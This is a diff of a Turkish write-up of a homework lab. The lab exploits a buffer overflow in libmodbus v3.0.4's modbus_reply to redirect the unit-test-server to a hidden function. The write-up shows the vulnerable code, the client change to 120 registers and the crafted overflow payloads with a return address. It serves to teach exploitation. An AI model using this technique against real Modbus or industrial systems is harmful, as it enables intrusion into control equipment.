@@ -4,9 +4,9 @@ ABD'de master okuyan yabancı bir arkadaşım yardım etmem için ve aynı zaman
 
 Assignment:
 
-```
+
 Libmodbus v3.0.4 overflow açığı barındırmaktadır. Açık modbus.c dosyasında modbus_reply fonksiyonunda ortaya çıkıyor. Bir sanal makinede bu versiyon derlendi ve kuruldu. Bu kütüphane ile beraber gelen test programları var: unit-test-server ve unit-test-client. unit-test-server kaynak kodlarına gizli bir fonksiyon yerleştirildi. Açığı kullarak bu fonksiyona atlamak.
-```
+
 
 Libmodbus açık kaynak kodlu bir kütüphane. Modbus protokolüne uygun bir şekilde data alıp gönderir. Detaylı bilgi için: [libmodbus](https://libmodbus.org/documentation/)
 
@@ -117,7 +117,7 @@ int main(int argc, char*argv[])
             }
         }
 
-        rc = modbus_reply(ctx, query, rc, mb_mapping);								--> [1]
+        rc = modbus_reply(ctx, query, rc, mb_mapping);					--> [1]
         if (rc == -1) {
             break;
         }
@@ -163,7 +163,7 @@ Overflow işlemini tamamladığımıza göre payloadumuzu *mb_mapping* haritası
             int i, j;
             for (i = address, j = 6; i < address + nb; i++, j += 2) {
                 /* 6 and 7 = first value */
-                mb_mapping->tab_registers[i] =								--> [1]
+                mb_mapping->tab_registers[i] =						--> [1]
                     (req[offset + j] << 8) + req[offset + j + 1];
             }
 
@@ -187,7 +187,8 @@ Bu kod parçasında göze çarpan şey ise 2 byte bir yere yazılıyor. 260 byte
 ```
 NOT:
 
-Dikkat edilmesi gerek bir yer var o da address değerinin yazma ve okuma kısmında da aynı olması gerekir. Bu şekilde payloda yazıp payloadın başından okumaya başlayacağız.
+Dikkat edilmesi gerek bir yer var o da address değerinin yazma ve okuma kısmında da aynı olması gerekir. 
+Bu şekilde payloda yazıp payloadın başından okumaya başlayacağız.
 
 ```
 
@@ -226,9 +227,9 @@ NOT: debug default olarak açık
 
 ```c
     rc = modbus_write_registers(ctx, UT_REGISTERS_ADDRESS,
-                                UT_REGISTERS_NB, UT_REGISTERS_TAB);			--> UT_REGISTERS_NB değerini 120 olarak değiştirelim hexadecimal olarak 0x78 olmalı. 
-    printf("1/5 modbus_write_registers: ");
-    if (rc == UT_REGISTERS_NB) {
+                                UT_REGISTERS_NB, UT_REGISTERS_TAB);	--> UT_REGISTERS_NB değerini 
+    printf("1/5 modbus_write_registers: ");				--> 120 olarak değiştirelim 
+    if (rc == UT_REGISTERS_NB) {					--> hexadecimal olarak 0x78 olmalı. 
         printf("OK\n");
     } else {
         printf("FAILED\n");
@@ -357,8 +358,11 @@ Bu adresten hemen önce main'e return adresi var. Güzel olan şey ise bizim adr
 return adresinden önce 15 tane c var o zaman paylodu şu şekil değiştirelim:
 
 ```
-önceki hali --> packet3 = "\x43"*66*2 + "\x43"*8
-yeni hali   --> packet3 = "\x43"*15 + "\xef\xbe\xad\xde" + "\x08\xc0\x04\x08" + "\x43" * (66*2 - 15 - 8) + "\x43"*8
+önceki hali:
+packet3 = "\x43"*66*2 + "\x43"*8
+
+yeni hali:
+packet3 = "\x43"*15 + "\xef\xbe\xad\xde" + "\x08\xc0\x04\x08" + "\x43" * (66*2 - 15 - 8) + "\x43"*8
 ```
 
 Bu sefer çalıştıralım:
@@ -368,7 +372,8 @@ Bu sefer çalıştıralım:
 İlk C karakterinin başına bir olay geliyor o yüzden bizim 16 girmemiz lazım:
 
 ```
-yeni hali   --> packet3 = "\x43"*16 + "\xef\xbe\xad\xde" + "\x08\xc0\x04\x08" + "\x43" * (66*2 - 16 - 8) + "\x43"*8
+yeni hali:
+packet3 = "\x43"*16 + "\xef\xbe\xad\xde" + "\x08\xc0\x04\x08" + "\x43" * (66*2 - 16 - 8) + "\x43"*8
 ```
 
 ![Screenshot](./screenshots/17.png)
